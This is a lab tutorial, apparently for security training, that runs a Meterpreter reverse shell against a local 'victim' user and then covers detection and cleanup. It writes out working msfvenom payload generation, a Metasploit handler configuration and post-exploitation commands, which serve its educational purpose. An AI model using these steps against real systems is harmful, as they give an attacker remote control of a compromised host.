# Establishing a Meterpreter Session (Local Simulation Lab)

**Estimated time:** 30 minutes
**Skill level:** Beginner–Intermediate
**Environment:** Linux (tested on Kali/Ubuntu‑based systems)

---

## Overview

This lab simulates a complete exploitation chain using a **Meterpreter reverse shell**, executed entirely on a local system for educational purposes. Rather than attacking a remote host, you create a low‑privilege “victim” user, deliver a payload, establish a Meterpreter session, and explore post‑exploitation behavior.

The goal is not only to understand attacker workflows, but also to practice **recognizing evidence of compromise** and performing **proper cleanup**, mirroring real incident response tasks.

⚠️ **Important:**
This lab is for **authorized, educational use only**. Perform all steps in an isolated lab environment you own or control.

---

## Learning Objectives

By completing this lab, you will be able to:

* Explain how reverse Meterpreter payloads function
* Simulate remote code execution using a local unprivileged user
* Interact with a Meterpreter session using post‑exploitation commands
* Identify indicators of compromise (IoCs)
* Remove artifacts and restore the system after testing

---

## Lab Exercises

### Exercise 1: Simulate a Victim Environment

Create an unprivileged user to represent a compromised account:

```bash
sudo adduser victim --disabled-password --gecos ""
```

**Why this matters:**
Real intrusions often begin with limited privileges. Starting as a low‑privilege user mirrors realistic attack conditions.

---

### Exercise 2: Generate a Reverse Meterpreter Payload

Create a Linux x64 Meterpreter payload that connects back to the local host:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell64.elf
chmod +x shell64.elf
sudo cp shell64.elf /home/victim/
sudo chown victim:victim /home/victim/shell64.elf
```

**Why this matters:**
This simulates payload delivery through methods such as phishing, trojanized binaries, or exploitation chains.

---

### Exercise 3: Start the Metasploit Listener

Launch Metasploit and configure a handler:

```bash
msfconsole
```

Inside Metasploit:

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

**Why this matters:**
The handler acts as a command‑and‑control (C2) listener, waiting for compromised hosts to connect back.

---

### Exercise 4: Trigger the Payload

In a second terminal, execute the payload as the victim user:

```bash
sudo -u victim /home/victim/shell64.elf
```

You should see output similar to:

```text
[*] Sending stage ...
[*] Meterpreter session 1 opened
```

**Why this matters:**
This is the moment of successful exploitation and remote control.

---

### Exercise 5: Interact With the Meterpreter Session

From the Meterpreter prompt, run:

```text
getuid
sysinfo
pwd
```

These commands confirm:

* Current user context
* System information
* Working directory

**Why this matters:**
Post‑exploitation reconnaissance allows attackers to understand the environment and plan next steps.

---

### Exercise 6: Blue Team Challenge — Detect the Compromise

Switch roles and act as a defender.

Look for indicators such as:

* Unexpected ELF binaries in user home directories
* Suspicious outbound network connections (e.g., to port 4444)
* Unusual process execution under a low‑privilege account
* Recently created user accounts

Document what you would investigate and which logs or tools you would use.

---

### Exercise 7: Cleanup and Recovery

Remove all artifacts created during the lab:

```bash
sudo rm /home/victim/shell64.elf
sudo deluser --remove-home victim
```

**Why this matters:**
Cleanup reinforces good operational hygiene and mirrors post‑incident recovery steps.

---

## Summary

In this lab, you:

* Created a simulated victim user
* Generated and deployed a Meterpreter reverse shell
* Established a live Meterpreter session
* Executed post‑exploitation reconnaissance
* Practiced identifying evidence of compromise
* Restored the system to a clean state
